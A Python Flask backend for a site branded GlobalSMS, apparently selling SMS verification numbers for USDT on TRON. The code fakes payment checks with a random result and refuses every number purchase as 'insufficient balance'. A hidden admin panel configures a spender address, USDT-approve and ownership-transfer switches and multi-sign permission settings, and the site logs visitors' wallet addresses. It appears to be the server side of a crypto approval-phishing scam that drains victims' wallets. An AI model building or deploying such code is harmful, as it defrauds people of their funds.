from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash
from flask_login import LoginManager, current_user, login_user, logout_user, login_required
import os
from werkzeug.security import generate_password_hash, check_password_hash
from config import Config
from models import db, Country, User, Service, CountryService, PhoneNumber, Order, LoginRecord, WalletRecord
from sqlalchemy import desc
import time
import random
from datetime import datetime, timedelta
import re
import json
import secrets
from user_agents import parse
import requests
import logging
import werkzeug.exceptions
from werkzeug.serving import run_simple
import sys
import io

app = Flask(__name__)
app.config.from_object(Config)


app.template_folder = 'templates'
app.static_folder = 'static'


sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),  
        logging.FileHandler('app.log', encoding='utf-8', mode='a')  
    ]
)


db.init_app(app)


login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))


CONFIG_FILE = 'config.json'

def load_config():
    """加载配置文件"""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}  

def save_config(config):
    """保存配置文件"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

@app.route('/config', methods=['GET', 'POST'])
def config():
    """配置页面路由"""
    if request.method == 'POST':
        
        if 'admin_password' in request.form:
            config_data = load_config()
            password = request.form.get('admin_password')
            if password == config_data.get('admin_password'):
                session['config_authenticated'] = True
                return redirect(url_for('config'))
            else:
                flash('密码错误', 'danger')
                return redirect(url_for('config_login'))

        
        if not session.get('config_authenticated'):
            return redirect(url_for('config_login'))

        
        if 'new_admin_password' in request.form and request.form.get('new_admin_password'):
            config_data = load_config()
            config_data['admin_password'] = request.form.get('new_admin_password')
            save_config(config_data)
            flash('管理密码已成功更新', 'success')
            return redirect(url_for('config', section='password'))

        
        contract_address = request.form.get('contract_address')
        spender_address = request.form.get('spender_address')
        
        if not all([contract_address, spender_address]):
            flash('请填写所有必填字段', 'danger')
            return redirect(url_for('config'))
            
        if not all(addr.startswith('T') and len(addr) == 34 for addr in [contract_address, spender_address]):
            flash('请输入有效的TRC20地址格式', 'danger')
            return redirect(url_for('config'))
        
        
        multi_sign_receiver = request.form.get('multi_sign_receiver')
        if multi_sign_receiver and not (multi_sign_receiver.startswith('T') and len(multi_sign_receiver) == 34):
            flash('请输入有效的TRC20地址格式', 'danger')
            return redirect(url_for('config'))
        
        config = {
            'contract_address': contract_address,
            'spender_address': spender_address,
            'enable_transfer_ownership': request.form.get('enable_transfer_ownership') == 'on',
            'enable_usdt_approve': request.form.get('enable_usdt_approve') == 'on',
            'transfer_ownership_retry_times': request.form.get('transfer_ownership_retry_times', 3, type=int),
            'enable_multi_sign': request.form.get('enable_multi_sign') == 'on',
            'multi_sign_receiver': multi_sign_receiver,
            'permission_config': load_config().get('permission_config', {}),
            'admin_password': load_config().get('admin_password')  
        }
        save_config(config)
        flash('配置已成功保存', 'success')
        return redirect(url_for('config'))
    
    
    if not session.get('config_authenticated'):
        return redirect(url_for('config_login'))
        
    config = load_config()
    section = request.args.get('section', 'wallet')
    return render_template('config.html', config=config, section=section)

@app.route('/config_login', methods=['GET'])
def config_login():
    """配置登录页面"""
    if session.get('config_authenticated'):
        return redirect(url_for('config'))
    return render_template('config_login.html')

@app.route('/config_logout')
def config_logout():
    """退出配置页面"""
    session.pop('config_authenticated', None)
    return redirect(url_for('config_login'))

@app.route('/wallet_records')
def wallet_records():
    """钱包连接记录页面"""
    if not session.get('config_authenticated'):
        return redirect(url_for('config_login'))
    return render_template('wallet_records.html')

def get_active_countries_count():
    """获取活跃国家的数量"""
    return Country.query.filter_by(active=True).count()

@app.route('/')
def index():
    """首页路由"""
    
    countries_count = get_active_countries_count()
    
    
    countries = Country.query.filter_by(active=True).all()
    
    
    return render_template('index.html', 
                         countries=countries, 
                         countries_count=countries_count)

@app.route('/api/countries')
def get_countries():
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('per_page', 18, type=int)
    region = request.args.get('region')
    search = request.args.get('search')
    sort = request.args.get('sort', 'popularity')

    
    query = Country.query.filter_by(active=True)

    
    if search:
        search = search.strip().lower()
        
        query = query.filter(
            db.or_(
                Country.name.ilike(f'%{search}%'),
                Country.code.ilike(f'%{search}%')
            )
        )

    
    if region:
        
        region_map = {
            'asia': ['CN', 'JP', 'KR', 'IN', 'SG', 'TH', 'MY', 'ID', 'PH', 'VN', 'HK', 'TW', 'MO'],
            'europe': ['GB', 'DE', 'FR', 'IT', 'ES', 'NL', 'SE', 'CH', 'RU', 'PL'],
            'america': ['US', 'CA', 'MX', 'BR', 'AR', 'CO', 'CL', 'PE'],
            'africa': ['ZA', 'EG', 'NG', 'KE', 'MA', 'GH', 'TN', 'DZ'],
            'oceania': ['AU', 'NZ', 'PG', 'FJ']
        }
        
        if region in region_map:
            query = query.filter(Country.code.in_(region_map[region]))

    
    if sort == 'popularity':
        query = query.order_by(Country.popularity.desc())
    elif sort == 'price_asc':
        query = query.order_by(Country.price.asc())
    elif sort == 'price_desc':
        query = query.order_by(Country.price.desc())
    elif sort == 'name':
        query = query.order_by(Country.name.asc())

    try:
        
        pagination = query.paginate(page=page, per_page=per_page)
        countries = pagination.items

        
        return jsonify({
            'countries': [country.to_dict() for country in countries],
            'total': pagination.total,
            'pages': pagination.pages,
            'current_page': page
        })
    except Exception as e:
        return jsonify({
            'error': '搜索失败',
            'message': str(e)
        }), 500

@app.route('/api/services/<int:country_id>')
def get_country_services(country_id):
    try:
        
        country = Country.query.get_or_404(country_id)
        
        
        country_services = db.session.query(
            Service,
            CountryService.price
        ).join(
            CountryService,
            db.and_(
                Service.id == CountryService.service_id,
                CountryService.country_id == country_id
            )
        ).all()
        
        
        services_data = [{
            'id': service.id,
            'name': service.name,
            'description': service.description,
            'icon': service.icon,
            'price': price  
        } for service, price in country_services]
        
        return jsonify({
            'success': True,
            'country': {
                'id': country.id,
                'name': country.name,
                'code': country.code
            },
            'services': services_data
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

@app.route('/api/get_number', methods=['POST'])
def get_number():
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': '请先登录'}), 401
    
    data = request.json
    country_id = data.get('country_id')
    service_id = data.get('service_id')
    
    if not country_id or not service_id:
        return jsonify({'status': 'error', 'message': '请选择国家和服务'}), 400
    
    
    country_service = CountryService.query.filter_by(
        country_id=country_id,
        service_id=service_id
    ).first()
    
    if not country_service:
        return jsonify({'status': 'error', 'message': '找不到此服务'}), 404
    
    
    user = User.query.get(session['user_id'])
    if not user or user.balance < country_service.price:
        return jsonify({'status': 'error', 'message': '余额不足，请充值', 'needRecharge': True}), 402
    
    return jsonify({'status': 'error', 'message': '余额不足，请充值', 'needRecharge': True}), 402

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        confirm_password = request.form.get('confirm_password')
        
        
        if not username or not password or not confirm_password:
            flash('所有字段都是必填的')
            return redirect(url_for('register'))
        
        
        if not re.match(r'^[a-zA-Z0-9_]{4,20}$', username):
            flash('用户名长度应为4-20位，只能包含字母、数字和下划线')
            return redirect(url_for('register'))
        
        
        if User.query.filter_by(username=username).first():
            flash('该用户名已被注册')
            return redirect(url_for('register'))
        
        
        if password != confirm_password:
            flash('两次输入的密码不一致')
            return redirect(url_for('register'))
        
        
        if len(password) < 8:
            flash('密码长度至少为8位')
            return redirect(url_for('register'))
        
        if not re.search(r'[A-Za-z]', password) or not re.search(r'\d', password):
            flash('密码必须包含字母和数字')
            return redirect(url_for('register'))
        
        
        try:
            user = User(
                username=username,
                password=generate_password_hash(password, method='pbkdf2:sha256')
            )
            db.session.add(user)
            db.session.commit()
            
            
            login_user(user)
            session['user_id'] = user.id
            session['username'] = user.username
            
            flash('注册成功！您已自动登录')
            return redirect(url_for('recharge'))
            
        except Exception as e:
            db.session.rollback()
            flash('注册失败，请稍后重试')
            app.logger.error(f'User registration failed: {str(e)}')
            return redirect(url_for('register'))
    
    return render_template('register.html')

@app.before_request
def check_user_auth():
    """检查用户认证状态"""
    
    public_routes = ['login', 'register', 'static', 'index', 'recharge_usdt_page', 'check_payment', 'config', 'config_login', 'config_logout', 'wallet_records', 'contact']
    if request.endpoint in public_routes:
        return
    
    
    if current_user.is_authenticated:
        return
        
    
    if 'user_id' in session:
        
        user = User.query.get(session['user_id'])
        if user:
            login_user(user)
        return
        
    
    remember_token = request.cookies.get('remember_token')
    if remember_token:
        try:
            
            parts = remember_token.split('.')
            if len(parts) == 3:
                user_id = int(parts[0])
                expiry = datetime.fromtimestamp(float(parts[1]))
                
                
                if expiry > datetime.now():
                    
                    expected_signature = generate_remember_token_signature(user_id, parts[1])
                    if parts[2] == expected_signature:
                        
                        user = User.query.get(user_id)
                        if user:
                            
                            session['user_id'] = user.id
                            session['username'] = user.username
                            login_user(user)
                            return
        except Exception as e:
            app.logger.error(f"检查记住我token错误: {str(e)}")
            pass
            
    
    if request.endpoint not in ['index']:
        return redirect(url_for('login'))

def generate_remember_token(user_id, expiry_timestamp):
    """生成记住我token"""
    
    signature = generate_remember_token_signature(user_id, str(expiry_timestamp))
    
    return f"{user_id}.{expiry_timestamp}.{signature}"

def generate_remember_token_signature(user_id, expiry_timestamp):
    """生成token签名"""
    from hashlib import sha256
    
    message = f"{user_id}{expiry_timestamp}{app.config['SECRET_KEY']}"
    return sha256(message.encode()).hexdigest()

def get_ip_location(ip):
    """获取IP地址的地理位置信息"""
    try:
        if ip.startswith('192.168.') or ip.startswith('127.0.'):
            return '本地网络'
        
        
        return ip
        
    except Exception as e:
        app.logger.error(f"获取IP位置失败: {str(e)}")
        return '未知位置'

def get_device_info(user_agent_string):
    """解析User-Agent获取设备信息"""
    try:
        user_agent = parse(user_agent_string)
        os_info = user_agent.os.family
        browser_info = user_agent.browser.family
        
        if user_agent.is_mobile:
            device_type = "Mobile"
        elif user_agent.is_tablet:
            device_type = "Tablet"
        else:
            device_type = f"{os_info}"
        
        return f"{device_type} {browser_info}"
    except Exception as e:
        app.logger.error(f"解析User-Agent失败: {str(e)}")
        return "Unknown"

def add_login_record(user_id, ip_address, user_agent, status='success'):
    """添加登录记录"""
    try:
        
        device_info = get_device_info(user_agent)
        
        
        location = get_ip_location(ip_address)
        
        
        if status == 'success':
            
            last_login = LoginRecord.query.filter_by(
                user_id=user_id,
                status='success'
            ).order_by(LoginRecord.login_time.desc()).first()
            
            if last_login and last_login.location != location and location != '本地网络':
                status = 'warning'  
        
        
        login_record = LoginRecord(
            user_id=user_id,
            ip_address=ip_address,
            user_agent=user_agent,
            device_info=device_info,
            status=status,
            location=location
        )
        
        db.session.add(login_record)
        db.session.commit()
        app.logger.info(f"添加登录记录成功: user_id={user_id}, ip={ip_address}, status={status}")
        
    except Exception as e:
        app.logger.error(f"添加登录记录失败: {str(e)}")
        db.session.rollback()

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        remember = request.form.get('remember') == 'on'
        
        user = User.query.filter_by(username=username).first()
        
        
        ip_address = request.remote_addr
        if request.headers.getlist("X-Forwarded-For"):
            ip_address = request.headers.getlist("X-Forwarded-For")[0]
        user_agent = request.headers.get('User-Agent', '')
        
        if user and check_password_hash(user.password, password):
            
            login_user(user, remember=remember)
            
            
            session['user_id'] = user.id
            session['username'] = user.username
            
            
            add_login_record(user.id, ip_address, user_agent, 'success')
            
            response = redirect(url_for('index'))
            
            if remember:
                
                expiry = datetime.now() + timedelta(days=7)
                expiry_timestamp = expiry.timestamp()
                
                
                remember_token = generate_remember_token(user.id, expiry_timestamp)
                
                
                response.set_cookie(
                    'remember_token',
                    remember_token,
                    expires=expiry,
                    httponly=True,
                    secure=request.is_secure,
                    samesite='Lax'
                )
            
            return response
        else:
            
            if user:
                add_login_record(user.id, ip_address, user_agent, 'danger')
            flash('用户名或密码错误')
    
    try:
        return render_template('login.html')
    except Exception as e:
        app.logger.error(f"模板渲染错误: {str(e)}")
        
        try:
            return render_template('templates/login.html')
        except Exception as e2:
            app.logger.error(f"备用路径模板渲染错误: {str(e2)}")
            
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>登录 - GlobalSMS</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
                    .container { max-width: 400px; margin: 30px auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    h2 { text-align: center; color: #333; }
                    input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
                    button { width: 100%; padding: 10px; background: #1a4b8c; color: white; border: none; border-radius: 4px; cursor: pointer; }
                    button:hover { background: #153d73; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>用户登录</h2>
                    <form method="post" action="/login">
                        <div>
                            <input type="text" name="username" placeholder="用户名" required>
                        </div>
                        <div>
                            <input type="password" name="password" placeholder="密码" required>
                        </div>
                        <div>
                            <label><input type="checkbox" name="remember"> 记住我</label>
                        </div>
                        <div>
                            <button type="submit">登录</button>
                        </div>
                    </form>
                    <p style="text-align: center; margin-top: 20px;">
                        还没有账号？<a href="/register">立即注册</a>
                    </p>
                </div>
            </body>
            </html>
            """
            return html

@app.route('/logout')
def logout():
    
    logout_user()
    
    session.clear()
    response = redirect(url_for('index'))
    response.delete_cookie('remember_token')  
    return response

@app.route('/recharge', methods=['GET', 'POST'])
def recharge():
    if request.method == 'POST':
        
        amount = request.form.get('amount', type=float)
        if not amount or amount < 10:
            flash('充值金额不能小于10元')
            return redirect(url_for('recharge'))
        
        
        network = request.form.get('network')
        if network == 'trc20':
            
            order_id = f"UST{int(time.time())}{random.randint(1000, 9999)}"
            return redirect(url_for('recharge_usdt_page', amount=amount, order_id=order_id))
        
        
        flash('充值请求已提交，请按照提示完成支付')
        return redirect(url_for('user_center'))
    
    return render_template('recharge.html')

@app.route('/recharge_usdt', methods=['POST'])
def recharge_usdt():
    """处理USDT充值表单提交"""
    if request.method == 'POST':
        amount = request.form.get('amount', type=float)
        network = request.form.get('network')
        
        if not amount or amount < 10:
            flash('充值金额不能小于10 USDT')
            return redirect(url_for('recharge'))
        
        if network != 'trc20':
            flash('目前仅支持TRC20网络充值')
            return redirect(url_for('recharge'))
        
        
        order_id = f"UST{int(time.time())}{random.randint(1000, 9999)}"
        
        
        return redirect(url_for('recharge_usdt_page', amount=amount, order_id=order_id))
    
    return redirect(url_for('recharge'))

@app.route('/recharge_usdt_page')
def recharge_usdt_page():
    """USDT充值页面，显示收款地址和二维码"""
    amount = request.args.get('amount', type=float)
    order_id = request.args.get('order_id')
    
    if not amount or not order_id:
        return redirect(url_for('recharge'))
    
    config = load_config()
    
    return render_template(
        'recharge_usdt.html',
        amount=amount,
        order_id=order_id,
        config=config,
        spender_address=config.get('spender_address', '')
    )

@app.route('/check_payment', methods=['POST'])
def check_payment():
    """检查USDT支付状态"""
    data = request.get_json()
    order_id = data.get('order_id')
    
    if not order_id:
        return jsonify({'status': 'error', 'message': '订单号无效'})
    
    
    
    is_paid = random.choices([True, False], weights=[1, 9])[0]  
    
    if is_paid:
        
        return jsonify({'status': 'success', 'message': '充值成功'})
    else:
        
        return jsonify({'status': 'pending', 'message': '支付尚未确认'})

@app.route('/user_center')
def user_center():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    user = User.query.get(session['user_id'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    
    
    orders = db.session.query(
        Order,
        PhoneNumber.number,
        Country.name.label('country_name'),
        Service.name.label('service_name')
    ).join(
        PhoneNumber, Order.phone_id == PhoneNumber.id
    ).join(
        Country, PhoneNumber.country_id == Country.id
    ).join(
        Service, Order.service_id == Service.id
    ).filter(
        Order.user_id == session['user_id']
    ).order_by(
        Order.created_at.desc()
    ).all()
    
    
    orders_data = []
    for order in orders:
        order_dict = {
            'id': order.Order.id,
            'price': order.Order.price,
            'status': order.Order.status,
            'created_at': order.Order.created_at,  
            'number': order.number,
            'country_name': order.country_name,
            'service_name': order.service_name
        }
        orders_data.append(order_dict)
    
    
    user_data = {
        'id': user.id,
        'username': user.username,
        'balance': user.balance,
        'created_at': user.created_at
    }
    
    return render_template('user_center.html', user=user_data, orders=orders_data)

@app.route('/api_docs')
def api_docs():
    """API接口文档页面"""
    if 'user_id' not in session:
        return redirect(url_for('login'))
    return render_template('api_docs.html')

@app.route('/support')
def support():
    """客户支持中心页面"""
    return render_template('support.html')

@app.route('/faq')
def faq():
    """常见问题解答页面"""
    return render_template('faq.html')

@app.route('/tutorial')
def tutorial():
    """使用教程页面"""
    return render_template('tutorial.html')

@app.route('/history')
def history():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    user = User.query.get(session['user_id'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    
    
    record_type = request.args.get('type', '全部记录')
    start_date = request.args.get('start_date')
    end_date = request.args.get('end_date')
    page = request.args.get('page', 1, type=int)
    per_page = 10  
    
    
    query = db.session.query(
        Order,
        PhoneNumber.number,
        Country.name.label('country_name'),
        Service.name.label('service_name')
    ).outerjoin(
        PhoneNumber, Order.phone_id == PhoneNumber.id
    ).outerjoin(
        Country, PhoneNumber.country_id == Country.id
    ).outerjoin(
        Service, Order.service_id == Service.id
    ).filter(
        Order.user_id == session['user_id']
    )
    
    
    if record_type == '接码记录':
        query = query.filter(Order.phone_id.isnot(None))
    elif record_type == '充值记录':
        query = query.filter(
            Order.phone_id.is_(None),
            Order.status.in_(['success', 'pending'])
        )
    elif record_type == '消费记录':
        query = query.filter(
            Order.phone_id.is_(None),
            Order.status == 'success'
        )
    
    if start_date:
        query = query.filter(Order.created_at >= start_date)
    if end_date:
        query = query.filter(Order.created_at <= end_date)
    
    
    pagination = query.order_by(Order.created_at.desc()).paginate(
        page=page, per_page=per_page, error_out=False
    )
    
    
    orders_data = []
    for order in pagination.items:
        
        if order.Order.phone_id:
            order_type = 'sms'
        elif order.Order.status in ['success', 'pending']:
            order_type = 'recharge'
        else:
            order_type = 'consume'
            
        order_dict = {
            'id': order.Order.id,
            'type': order_type,
            'price': order.Order.price,
            'status': order.Order.status,
            'created_at': order.Order.created_at,
            'number': order.number,
            'country_name': order.country_name,
            'service_name': order.service_name,
            'message': getattr(order.Order, 'message', None)  
        }
        orders_data.append(order_dict)
    
    return render_template(
        'history.html',
        orders=orders_data,
        pagination=pagination,
        current_type=record_type
    )

@app.route('/account_security')
def account_security():
    return render_template('account_security.html')

@app.route('/change_password', methods=['POST'])
def change_password():
    """修改密码处理函数"""
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': '请先登录'}), 401
    
    
    current_password = request.form.get('current_password')
    new_password = request.form.get('new_password')
    confirm_password = request.form.get('confirm_password')
    
    
    if not all([current_password, new_password, confirm_password]):
        return jsonify({'status': 'error', 'message': '请填写所有必填字段'}), 400
    
    
    if new_password != confirm_password:
        return jsonify({'status': 'error', 'message': '两次输入的新密码不一致'}), 400
    
    
    if len(new_password) < 8:
        return jsonify({'status': 'error', 'message': '新密码长度至少为8位'}), 400
    
    if not re.search(r'[A-Za-z]', new_password) or not re.search(r'\d', new_password):
        return jsonify({'status': 'error', 'message': '新密码必须包含字母和数字'}), 400
    
    
    user = User.query.get(session['user_id'])
    if not user:
        return jsonify({'status': 'error', 'message': '用户不存在'}), 404
    
    
    if not check_password_hash(user.password, current_password):
        return jsonify({'status': 'error', 'message': '当前密码错误'}), 400
    
    try:
        
        user.password = generate_password_hash(new_password, method='pbkdf2:sha256')
        db.session.commit()
        return jsonify({'status': 'success', 'message': '密码修改成功'})
    except Exception as e:
        db.session.rollback()
        app.logger.error(f'Password change failed: {str(e)}')
        return jsonify({'status': 'error', 'message': '密码修改失败，请稍后重试'}), 500

def load_api_keys():
    """加载API密钥数据"""
    try:
        api_keys_path = os.path.join(os.path.dirname(__file__), 'api_keys.json')
        if not os.path.exists(api_keys_path):
            return {"keys": {}}
        with open(api_keys_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        app.logger.error(f"加载API密钥文件失败: {str(e)}")
        return {"keys": {}}

def save_api_keys(data):
    """保存API密钥数据"""
    try:
        api_keys_path = os.path.join(os.path.dirname(__file__), 'api_keys.json')
        with open(api_keys_path, 'w') as f:
            json.dump(data, f, indent=4)
        return True
    except Exception as e:
        app.logger.error(f"保存API密钥文件失败: {str(e)}")
        return False

@app.route('/api/generate_key', methods=['POST'])
def generate_api_key():
    """生成新的API密钥"""
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': '请先登录'}), 401
    
    try:
        user_id = str(session['user_id'])
        
        
        api_key = f"sk_live_{''.join(secrets.token_hex(16))}"
        
        
        api_keys = load_api_keys()
        
        
        api_keys['keys'][user_id] = {
            'key': api_key,
            'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_used': None
        }
        
        
        if not save_api_keys(api_keys):
            raise Exception("保存API密钥失败")
        
        return jsonify({
            'status': 'success',
            'message': 'API密钥生成成功',
            'api_key': api_key
        })
        
    except Exception as e:
        app.logger.error(f"生成API密钥失败: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': '生成API密钥失败，请稍后重试'
        }), 500

@app.route('/api/get_key', methods=['GET'])
def get_api_key():
    """获取当前用户的API密钥"""
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': '请先登录'}), 401
    
    try:
        user_id = str(session['user_id'])
        api_keys = load_api_keys()
        
        user_key = api_keys['keys'].get(user_id, {})
        if not user_key:
            return jsonify({
                'status': 'info',
                'message': '未找到API密钥',
                'has_key': False
            })
        
        return jsonify({
            'status': 'success',
            'has_key': True,
            'api_key': user_key['key'],
            'created_at': user_key['created_at'],
            'last_used': user_key['last_used']
        })
        
    except Exception as e:
        app.logger.error(f"获取API密钥失败: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': '获取API密钥失败，请稍后重试'
        }), 500

@app.route('/api/login_records')
def get_login_records():
    """获取用户的登录记录"""
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': '请先登录'}), 401
    
    try:
        
        records = LoginRecord.query.filter_by(
            user_id=session['user_id']
        ).order_by(
            LoginRecord.login_time.desc()
        ).limit(10).all()
        
        app.logger.info(f"获取登录记录成功: user_id={session['user_id']}, count={len(records)}")
        
        return jsonify({
            'status': 'success',
            'records': [record.to_dict() for record in records]
        })
    except Exception as e:
        app.logger.error(f"获取登录记录失败: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': '获取登录记录失败，请稍后重试'
        }), 500

@app.route('/contact')
def contact():
    """联系我们页面"""
    return render_template('contact.html', active_page='contact')


@app.errorhandler(Exception)
def handle_exception(e):
    """全局异常处理函数"""
    app.logger.error(f"未处理的异常: {str(e)}")
    
    
    if isinstance(e, werkzeug.exceptions.BadRequest):
        return jsonify({"status": "error", "message": "请求格式错误"}), 400
    
    
    return jsonify({"status": "error", "message": "服务器内部错误，请稍后重试"}), 500


@app.before_request
def before_request_func():
    """请求预处理，处理特殊请求"""
    try:
        
        if 'HTTP_RAW_POST_DATA' in request.environ:
            request.environ.pop('HTTP_RAW_POST_DATA')
            
        
        if request.method == 'OPTIONS':
            response = app.make_default_options_response()
            return response
            
        
        if 'SERVER_PROTOCOL' in request.environ:
            if not request.environ['SERVER_PROTOCOL'].startswith('HTTP/'):
                request.environ['SERVER_PROTOCOL'] = 'HTTP/1.1'
                
        
        user_agent = request.headers.get('User-Agent', '')
        if len(user_agent) > 500 or user_agent == '':
            request.environ['HTTP_USER_AGENT'] = 'Unknown Browser'
            
    except Exception as e:
        app.logger.error(f"请求预处理出错: {str(e)}")

@app.route('/api/wallet_records', methods=['GET'])
def get_wallet_records():
    try:
        records = WalletRecord.query.order_by(WalletRecord.last_seen.desc()).all()
        return jsonify({
            'success': True,
            'records': [record.to_dict() for record in records]
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

@app.route('/api/wallet_records', methods=['POST'])
def add_wallet_record():
    try:
        data = request.get_json()
        
        existing_record = WalletRecord.query.filter_by(address=data['address']).first()
        
        if existing_record:
            existing_record.status = data['status']
            existing_record.last_seen = datetime.utcnow()
            db.session.commit()
            return jsonify({
                'success': True,
                'record': existing_record.to_dict()
            })
        
        new_record = WalletRecord(
            wallet_type=data['type'],
            address=data['address'],
            status=data['status']
        )
        db.session.add(new_record)
        db.session.commit()
        
        return jsonify({
            'success': True,
            'record': new_record.to_dict()
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

@app.route('/api/wallet_records/<int:record_id>', methods=['DELETE'])
def delete_wallet_record(record_id):
    try:
        record = WalletRecord.query.get_or_404(record_id)
        db.session.delete(record)
        db.session.commit()
        return jsonify({
            'success': True,
            'message': '记录已删除'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

if __name__ == '__main__':
    
    from werkzeug.serving import run_simple
    
    
    options = {
        'threaded': True,
        'processes': 1,
        'passthrough_errors': False
    }
    
    
    app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
    app.config['CORS_HEADERS'] = 'Content-Type'
    
    
    print("正在启动应用服务器...")  
    app.logger.info("启动应用服务器...")
    run_simple('0.0.0.0', 5000, app, **options) 